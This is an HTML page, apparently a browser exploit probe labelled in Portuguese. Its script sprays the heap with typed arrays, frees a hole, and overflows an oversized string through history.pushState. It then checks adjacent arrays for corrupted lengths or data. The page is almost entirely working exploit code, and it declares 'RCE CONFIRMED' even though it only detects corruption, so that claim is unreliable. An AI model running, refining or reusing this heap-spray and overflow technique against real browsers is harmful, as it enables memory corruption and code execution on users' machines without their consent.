<!DOCTYPE html>
<html>
<head>
    <title>Deep Injector: Safe Flood</title>
    <style>
        body { background: #000; color: #aaa; font-family: monospace; padding: 20px; }
        .log { 
            border: 1px solid #333; height: 300px; overflow-y: scroll; 
            padding: 10px; background: #111; margin-top:10px; color: #0f0; 
        }
        button { 
            padding: 15px; width: 100%; font-size: 18px; font-weight: bold; 
            margin-bottom: 10px; cursor: pointer; border: none;
        }
        .btn-safe { background: #224422; color: #fff; }
        .btn-risk { background: #442200; color: #fff; }
    </style>
</head>
<body>
    <h1>DEEP INJECTOR</h1>
    <p>Base: 709518 | Hole: 168</p>

    <button class="btn-safe" onclick="runTest(0x00, 32)">1. INUNDAR COM ZEROS (32 Bytes)</button>
    <button class="btn-safe" onclick="runTest(0x14, 32)">2. INUNDAR COM 0x14 (32 Bytes)</button>
    <button class="btn-risk" onclick="runTest(0x14, 48)">3. INUNDAR MAIS FUNDO (48 Bytes)</button>

    <div id="logger" class="log">Escolha uma estratégia...</div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const HOLE_SIZE = 168;    
        const SPRAY_SIZE = 8000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runTest(byteVal, repeatCount) {
            log("---------------------------------------");
            log(`INJETANDO ${repeatCount} bytes de valor 0x${byteVal.toString(16)}...`);

            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 300));
            spray = [];

            // Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; // Marker
                arr[1] = i;         // Index
                arr[2] = 0xDEADBEEF; // Debug extra
                spray.push(arr);
            }

            // Buraco
            let center = 4000;
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // Constrói Payload
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Constrói a Inundação (Flood)
                // Usamos o valor seguro repetido várias vezes para atravessar o Header
                let overflow = new Array(repeatCount + 1).join(String.fromCharCode(byteVal));
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                checkCorruption(HOLE_SIZE, center);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            let limit = startIdx + holeUsed + 60;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // VERIFICA SE O OBJETO QUEBROU (Length virou 0 ou undefined)
                    // Se escrevermos ZEROS no header, o length pode "sumir" ou virar 0.
                    if(arr.length === 0 || arr.length === undefined) {
                         found = true;
                         reportSuccess(i, "BROKEN OBJECT (Zeroed)", 0);
                         return;
                    }

                    // VERIFICA SE O TAMANHO AUMENTOU
                    if(arr.length !== 1024) {
                        found = true;
                        reportSuccess(i, "LENGTH CHANGE", arr.length);
                        return;
                    }
                    
                    // VERIFICA SE OS DADOS MUDARAM
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`DADOS ALTERADOS no Index ${i}, mas Length normal.`);
                        log(`Lido: 0x${arr[0].toString(16)}`);
                    }
                }
            }
            if(!found) log("Nenhum efeito visível. Tente ir 'Mais Fundo' (mais bytes).");
        }

        function reportSuccess(idx, type, len) {
            document.body.style.background = "#004400";
            document.body.innerHTML = `<h1 style='color:lime; font-size:40px'>RCE CONFIRMED</h1><h2>Index: ${idx}</h2><h2>Type: ${type}</h2><h2>New Length: ${len}</h2>`;
            alert(`SUCESSO!\nIndex: ${idx}\nLength: ${len}`);
        }
    </script>
</body>
</html>
